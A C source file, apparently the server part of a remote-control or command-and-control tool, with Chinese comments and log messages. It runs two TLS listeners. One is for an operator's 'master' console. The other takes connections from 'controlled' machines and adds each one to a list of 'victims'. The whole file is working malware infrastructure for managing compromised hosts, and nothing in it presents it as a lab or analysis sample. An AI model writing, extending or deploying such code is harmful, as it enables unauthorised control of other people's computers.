#include "server.h"
#include "../util/printlog.h"
#include "../util/getip.h"
#include "session.h"
#include "victim.h"
#include <pthread.h>
#include <event2/event.h>
#include <hv/hloop.h>
#include <unistd.h>

Server server;

// 为主控端提供服务
void server_m_on_accept(hio_t * io) {
    event2_print_log(EVENT_LOG_MSG, "<- 主控端请求");
    SessionEstablishResult ser = session_establish(io);
    if (result_is_err(ser)) {
        switch (result_unwrap(ser)) {
            case SessionEstablishErrOccupied:
                event2_print_log(EVENT_LOG_WARN, "已存在另一个尝试或已经建立的会话.");
                break;
            case SessionEstablishErrOther:
            default:
                event2_print_log(EVENT_LOG_WARN, "会话建立" FAILED ".");
                break;
        }
    } else {
        event2_print_log(EVENT_LOG_MSG, "-- 主控端会话建立 --");
    }
}

// 为受控端提供服务
void server_e_on_accept(hio_t * io) {
    event2_print_log(EVENT_LOG_MSG, "<- 受控端请求");
    VictimsAddResult add_result = victims_add(io);
    if (result_is_err(add_result)) {
        switch (result_unwrap(add_result)) {
            case VictimsAddErrOther:
            default:
                event2_print_log(EVENT_LOG_ERR, "添加受害者失败");
                break;
        }
    } else {
        print_logl("受害者 " CHALK_YELLOW("%d") " 添加", result_unwrap(add_result));
    }
}

ServerInitResult server_init() {
    ServerInitResult res = result_new_ok(0);
    char ip_adddr[INET_ADDRSTRLEN] = {0};
    getip(ip_adddr);
    if (!ip_adddr[0]) {
        result_turn_err(res, ServerInitGetIP);
        return res;
    }
    hssl_ctx_opt_t ssl_param;
    memset(&ssl_param, 0, sizeof(ssl_param));
    ssl_param.crt_file = "cert/m/server.crt";
    ssl_param.key_file = "cert/m/server.key";
    ssl_param.endpoint = HSSL_SERVER;
    server.m.port = config.mport;
    server.m.hloop = hloop_new(0);
    hio_t * mio = hloop_create_ssl_server(server.m.hloop, ip_adddr, server.m.port, server_m_on_accept);
    if (!mio) {
        result_turn_err(res, ServerInitErrSSLServerCreate);
        return res;
    } else {
        server.m.io = mio;
    }
    if (hio_new_ssl_ctx(mio, &ssl_param)) {
        result_turn_err(res, ServerInitErrSSLCtx);
        return res;
    }

    memset(&ssl_param, 0, sizeof(ssl_param));
    ssl_param.crt_file = "cert/e/server.crt";
    ssl_param.key_file = "cert/e/server.key";
    ssl_param.endpoint = HSSL_SERVER;
    server.e.port = config.eport;
    server.e.hloop = hloop_new(0);
    hio_t * eio = hloop_create_ssl_server(server.e.hloop, ip_adddr, server.e.port, server_e_on_accept);
    if (!eio) {
        result_turn_err(res, ServerInitErrSSLServerCreate);
        return res;
    } else {
        server.e.io = eio;
    }
    if (hio_new_ssl_ctx(eio, &ssl_param)) {
        result_turn_err(res, ServerInitErrSSLCtx);
        return res;
    }
    return res;
}

static void * server_mptherad_routine(void *) {
    event2_print_log(EVENT_LOG_MSG, "主控端服务器启动...");
    hloop_run(server.m.hloop);
}

static void * server_epthread_routine(void *) {
    event2_print_log(EVENT_LOG_MSG, "受控端服务器启动...");
    hloop_run(server.e.hloop);
}

void server_start() {
    // 启动服务器线程
    pthread_create(&server.m.pthread, NULL, server_mptherad_routine, NULL);
    pthread_create(&server.e.pthread, NULL, server_epthread_routine, NULL);
}

void server_quit() {
    // 停止服务器循环，停止服务器线程
    print_logl("停止主控端服务器...");
    hloop_stop(server.m.hloop);
    pthread_join(server.m.pthread, NULL);
    hloop_free(&server.m.hloop);
    print_logl("主控端服务器停止 " SUCCESSFULLY ".");

    print_logl("停止受控端服务器...");
    hloop_stop(server.e.hloop);
    pthread_join(server.e.pthread, NULL);
    hloop_free(&server.e.hloop);
    print_logl("受控端服务器终止 " SUCCESSFULLY  ".");

    // 释放 session
    pthread_mutex_lock(&session.lock);
    pthread_mutex_unlock(&session.lock);
    pthread_mutex_destroy(&session.lock);
}